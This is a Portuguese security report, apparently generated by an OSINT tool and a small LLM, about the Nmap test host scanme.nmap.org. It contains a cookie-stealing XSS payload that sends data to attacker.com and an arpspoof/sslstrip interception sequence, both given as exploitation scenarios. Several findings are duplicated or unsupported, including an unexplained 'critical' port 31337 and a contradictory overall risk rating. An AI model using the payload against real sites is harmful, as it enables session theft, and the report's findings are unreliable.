# SENTINEL OSINT — Relatório de Inteligência

**Alvo:** `scanme.nmap.org`
**Classificação de Risco:** ⚪ **INDETERMINADO**
**Data da Análise:** 2026-04-11 19:50:16
**Gerado por:** Sentinel OSINT v1.0.0-dev | ollama / llama3.1:8b
**Classificação:** USO INTERNO — CONFIDENCIAL

---

## Resumo de Achados

| Severidade | Quantidade |
|:-----------|:----------:|
| 🔴 CRÍTICO  | 1 |
| 🟠 ALTO     | 3 |
| 🟡 MÉDIO    | 3 |
| 🔵 BAIXO    | 2 |
| ⚪ INFO      | 0 |
| **TOTAL**  | **10** |

---


## 01. Sumário Executivo

**Nível de Risco Global: ⚪ INDETERMINADO**

A análise identificou **10 achados** de segurança, sendo **1 críticos** e **3 altos**. 
Os achados críticos — Porta 31337 aberta — requerem remediação imediata em menos de 24 horas para reduzir a exposição ao risco.

---

## 02. Perfil de Ameaça

> Perfil inferido a partir dos achados identificados.

| Dimensão | Avaliação |
|:---------|:----------|
| Valor para atacante | ALTO — presença de serviços críticos expostos |
| Perfil de ameaça primário | Oportunista / Ransomware |
| Motivação | Acesso inicial / Reconhecimento |

---

## 03. Superfície de Ataque

### Portas e Serviços Expostos

- Porta 31337 aberta

### Análise de Headers HTTP

| Categoria | Severidade | Finding |
|:----------|:----------:|:--------|
| Transport Security | 🟠 ALTO | HTTPS indisponivel e HSTS ausente |
| Security Headers | 🟡 MÉDIO | Headers de protecao ausentes: content-security-policy, x-frame-options, x-content-type-options |
| Information Disclosure | 🔵 BAIXO | Information leakage via headers HTTP |

---

## 04. Findings Detalhados

Total de achados: **10**

### F-001 | 🔴 CRÍTICO — Porta 31337 aberta

| Campo | Detalhe |
|:------|:--------|
| **Severidade** | 🔴 CRÍTICO |
| **MITRE ATT&CK** | [T1571](https://attack.mitre.org/techniques/T1571/) — None |
| **Prazo de remediação** | < 24 horas |
| **Categoria** | None |

**Descrição**

Porta 31337 está aberta, permitindo acesso não autorizado.

────────────────────────────────────────────────────────────

### F-002 | 🟠 ALTO — HTTPS indisponivel e HSTS ausente

| Campo | Detalhe |
|:------|:--------|
| **Severidade** | 🟠 ALTO |
| **MITRE ATT&CK** | [T1557](https://attack.mitre.org/techniques/T1557/) — Adversary-in-the-Middle |
| **Prazo de remediação** | < 7 dias |
| **Categoria** | Transport Security |
| **Fonte** | Header Agent (determinístico) |

**Descrição**

Servidor responde apenas em HTTP. Todo trafego transitado em texto claro. HSTS ausente impede que browsers forcam HTTPS, habilitando downgrade de protocolo.

**Evidência**

```
HTTPS falhou para https://scanme.nmap.org, HTTP respondeu em http://scanme.nmap.org | Header 'strict-transport-security' não presente na resposta
```

**Cenário de Exploração**

- **Complexidade:** BAIXA

> 1.
> Atacante em rede intermediaria executa: arpspoof -i eth0 -t <vitima> <gateway>.
> 2.
> sslstrip intercepta requisicoes HTTPS e as serve como HTTP.
> 3.
> Credenciais e cookies de sessao capturados em texto claro com Wireshark.

**Remediação**

**Ação:** Configurar TLS valido e adicionar: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

**Verificação:**
```bash
curl -I http://alvo | grep -i strict-transport
```

────────────────────────────────────────────────────────────

### F-003 | 🟠 ALTO — SSH com versão exposta

| Campo | Detalhe |
|:------|:--------|
| **Severidade** | 🟠 ALTO |
| **MITRE ATT&CK** | [T1021.004](https://attack.mitre.org/techniques/T1021/004/) — None |
| **Prazo de remediação** | < 7 dias |
| **Categoria** | None |

**Descrição**

A versão do SSH está exposta, permitindo ataques de exploração.

────────────────────────────────────────────────────────────

### F-004 | 🟠 ALTO — HTTP sem criptografia (HSTS)

| Campo | Detalhe |
|:------|:--------|
| **Severidade** | 🟠 ALTO |
| **MITRE ATT&CK** | [T1557](https://attack.mitre.org/techniques/T1557/) — None |
| **Prazo de remediação** | < 7 dias |
| **Categoria** | None |

**Descrição**

O HTTP não está configurado com HSTS, permitindo ataques de man-in-the-middle.

────────────────────────────────────────────────────────────

### F-005 | 🟡 MÉDIO — Headers de protecao ausentes: content-security-policy, x-frame-options, x-content-type-options

| Campo | Detalhe |
|:------|:--------|
| **Severidade** | 🟡 MÉDIO |
| **MITRE ATT&CK** | [T1185](https://attack.mitre.org/techniques/T1185/) — Browser Session Hijacking |
| **Prazo de remediação** | < 30 dias |
| **Categoria** | Security Headers |
| **Fonte** | Header Agent (determinístico) |

**Descrição**

Ausencia simultanea de 5 headers de protecao. CSP ausente habilita XSS. X-Frame-Options ausente habilita clickjacking. Permissions-Policy ausente remove controle sobre APIs do browser.

**Evidência**

```
5 headers ausentes: content-security-policy, x-frame-options, x-content-type-options, referrer-policy, permissions-policy
```

**Cenário de Exploração**

- **Complexidade:** MEDIA

> 1.
> Atacante encontra input refletido na aplicacao.
> 2.
> Injeta: <script>fetch('https://attacker.com/?c='+document.cookie)</script>.
> 3.
> Sem CSP, script executa inline e exfiltra cookie de sessao.
> 4.
> Session hijacking com token roubado.

**Remediação**

**Ação:** Adicionar: Content-Security-Policy: default-src self; X-Frame-Options: DENY; Permissions-Policy: geolocation=(), microphone=(), camera=()

**Verificação:**
```bash
curl -I http://alvo | grep -iE 'content-security|x-frame|permissions'
```

────────────────────────────────────────────────────────────

### F-006 | 🟡 MÉDIO — Headers criticos ausentes (CSP, XFO, Permissions)

| Campo | Detalhe |
|:------|:--------|
| **Severidade** | 🟡 MÉDIO |
| **MITRE ATT&CK** | [T1185](https://attack.mitre.org/techniques/T1185/) — None |
| **Prazo de remediação** | < 30 dias |
| **Categoria** | None |

**Descrição**

Os headers CSP, XFO e Permissions estão ausentes, permitindo ataques de injeção de código.

────────────────────────────────────────────────────────────

### F-007 | 🟡 MÉDIO — Cookies sem flags (Secure, HttpOnly)

| Campo | Detalhe |
|:------|:--------|
| **Severidade** | 🟡 MÉDIO |
| **MITRE ATT&CK** | [T1185](https://attack.mitre.org/techniques/T1185/) — None |
| **Prazo de remediação** | < 30 dias |
| **Categoria** | None |

**Descrição**

Os cookies não têm as flags Secure e HttpOnly configuradas, permitindo ataques de injeção de código.

────────────────────────────────────────────────────────────

### F-008 | 🔵 BAIXO — Information leakage via headers HTTP

| Campo | Detalhe |
|:------|:--------|
| **Severidade** | 🔵 BAIXO |
| **MITRE ATT&CK** | [T1592.002](https://attack.mitre.org/techniques/T1592/002/) — Gather Victim Host Information: Software |
| **Prazo de remediação** | Monitorar |
| **Categoria** | Information Disclosure |
| **Fonte** | Header Agent (determinístico) |

**Descrição**

Headers HTTP revelam versao do servidor e stack de backend. Reduz esforco de reconhecimento — atacante usa versao exposta para buscar CVEs especificos sem fingerprinting ativo.

**Evidência**

```
server: Apache/2.4.7 (Ubuntu)
```

**Cenário de Exploração**

- **Complexidade:** TRIVIAL

> 1.
> curl -I http://alvo captura headers.
> 2.
> Server/X-Powered-By revela tecnologia e versao.
> 3.
> Busca CVEs em vulners.com ou NVD para a versao especifica.
> 4.
> Prioriza exploits publicos disponiveis.

**Remediação**

**Ação:** Remover headers: ServerTokens Prod (Apache) | server_tokens off (Nginx)

**Verificação:**
```bash
curl -I http://alvo | grep -iE 'server|x-powered'
```

────────────────────────────────────────────────────────────

### F-009 | 🔵 BAIXO — Info leakage (Server, X-Powered-By)

| Campo | Detalhe |
|:------|:--------|
| **Severidade** | 🔵 BAIXO |
| **MITRE ATT&CK** | [T1592.002](https://attack.mitre.org/techniques/T1592/002/) — None |
| **Prazo de remediação** | Monitorar |
| **Categoria** | None |

**Descrição**

A informação sobre o servidor e a tecnologia utilizada está vazando.

────────────────────────────────────────────────────────────

### F-010 | ⚪ HIGH/CRITICAL — Serviço web com CVEs publicos

| Campo | Detalhe |
|:------|:--------|
| **Severidade** | ⚪ HIGH/CRITICAL |
| **MITRE ATT&CK** | [T1190](https://attack.mitre.org/techniques/T1190/) — None |
| **Prazo de remediação** | Monitorar |
| **Categoria** | None |

**Descrição**

O serviço web está exposto e tem CVEs públicas, permitindo ataques de exploração.

────────────────────────────────────────────────────────────

---

## 05. Narrativa de Ataque

> *Esta seção descreve o caminho mais provável que um atacante real percorreria usando exclusivamente os dados coletados por fontes abertas. Nenhuma interação ativa com o alvo foi realizada.*

### Fase 1 — Reconhecimento Passivo

O alvo `scanme.nmap.org` foi identificado através de fontes abertas públicas. O reconhecimento inicial revelou a seguinte superfície de ataque:

A análise de headers HTTP complementou o perfil de exposição:
- HTTPS indisponivel e HSTS ausente
- Headers de protecao ausentes: content-security-policy, x-frame-options, x-content-type-options
- Information leakage via headers HTTP

### Fase 2 — Análise e Priorização

Com os dados em mãos, um atacante priorizaria os vetores críticos. O achado de maior valor imediato é **Porta 31337 aberta** — exploitável sem autenticação, com impacto direto no sistema.

### Fase 3 — Amplificação

Após o acesso inicial, os achados de severidade alta serviriam para ampliar o controle ou garantir persistência:

- **HTTPS indisponivel e HSTS ausente:** Servidor responde apenas em HTTP. Todo trafego transitado em texto claro. HSTS ausente impede que browsers forcam HTTPS,...
- **SSH com versão exposta:** A versão do SSH está exposta, permitindo ataques de exploração....
- **HTTP sem criptografia (HSTS):** O HTTP não está configurado com HSTS, permitindo ataques de man-in-the-middle....

### Fase 4 — Reconhecimento Interno

Os achados de severidade média fornecem inteligência adicional que um atacante persistente usaria para expandir o acesso:

- Headers de protecao ausentes: content-security-policy, x-frame-options, x-content-type-options
- Headers criticos ausentes (CSP, XFO, Permissions)
- Cookies sem flags (Secure, HttpOnly)

---

## 06. Hipóteses Adversariais

> Nenhuma hipótese adversarial gerada pelo modelo.

---

## 07. Pontos Cegos da Análise

> *Limitações inerentes ao reconhecimento passivo. Estes pontos devem ser investigados em um engagement de pentest ativo.*

| Área | Motivo | Impacto | Como coletar |
|:-----|:-------|:--------|:-------------|
| Autenticação interna | OSINT passivo não acessa recursos autenticados | Potenciais vulnerabilidades internas não mapeadas | Pentest ativo com credenciais |
| Configuração de WAF | Não detectável via headers públicos | Bypass pode ser mais fácil do que aparenta | Teste ativo de payloads |
| Versões internas de software | Banners podem estar ocultados | CVEs não mapeados | Scan autenticado |

---

## 08. Roadmap de Remediação

Ações ordenadas por severidade e prazo. Cada item inclui verificação para confirmar a remediação.

| # | Prioridade | Finding | Prazo | Ação |
|:--|:----------:|:--------|:------|:-----|
| 1 | 🔴 CRÍTICO | Porta 31337 aberta | < 24 horas | — |
| 2 | 🟠 ALTO | HTTPS indisponivel e HSTS ausente | < 7 dias | Configurar TLS valido e adicionar: Strict-Transport-Security: max-age=31536000; ... |
| 3 | 🟠 ALTO | SSH com versão exposta | < 7 dias | — |
| 4 | 🟠 ALTO | HTTP sem criptografia (HSTS) | < 7 dias | — |
| 5 | 🟡 MÉDIO | Headers de protecao ausentes: content-security-policy, x-frame-options, x-content-type-options | < 30 dias | Adicionar: Content-Security-Policy: default-src self; X-Frame-Options: DENY; Per... |
| 6 | 🟡 MÉDIO | Headers criticos ausentes (CSP, XFO, Permissions) | < 30 dias | — |
| 7 | 🟡 MÉDIO | Cookies sem flags (Secure, HttpOnly) | < 30 dias | — |
| 8 | 🔵 BAIXO | Information leakage via headers HTTP | Monitorar | Remover headers: ServerTokens Prod (Apache) | server_tokens off (Nginx) |
| 9 | 🔵 BAIXO | Info leakage (Server, X-Powered-By) | Monitorar | — |
| 10 | ⚪ HIGH/CRITICAL | Serviço web com CVEs publicos | Monitorar | — |

### Verificações de Remediação — Críticos e Altos

**HTTPS indisponivel e HSTS ausente**
```bash
curl -I http://alvo | grep -i strict-transport
```

---

## 09. Apêndice Técnico

### Metadados da Análise

| Campo | Valor |
|:------|:------|
| Alvo | `scanme.nmap.org` |
| Provider IA | ollama |
| Modelo | llama3.1:8b |
| Análise em | 2026-04-11T19:50:16 |
| Arquivo JSON | `data\scanme_nmap_org_20260411_195016_ai_analysis.json` |
| Confidence Score | None |

### Fontes de Dados Utilizadas

| Fonte | Tipo | Dados Coletados |
|:------|:-----|:----------------|
| WHOIS | Registro público | Registrar, datas, name servers |
| DNS | Infraestrutura pública | Registros A, MX, TXT, NS, CNAME |
| Shodan InternetDB | Indexação pública | Portas, serviços, CVEs |
| Certificate Transparency (crt.sh) | Logs públicos | Subdomínios, certificados |
| VirusTotal | Reputação pública | Classificação de domínio/IP |
| AbuseIPDB | Reputação pública | Score de abuso de IP |
| HTTP Headers | Requisição direta | Headers de segurança e info leakage |

### Disclaimer Legal

> Esta análise foi conduzida exclusivamente com dados públicos e fontes abertas (OSINT). Nenhuma interação ativa com sistemas do alvo foi realizada. O uso destas informações para fins maliciosos é tipificado como crime pela Lei 12.737/2012 (Brasil). Este relatório destina-se exclusivamente a fins defensivos e educacionais.
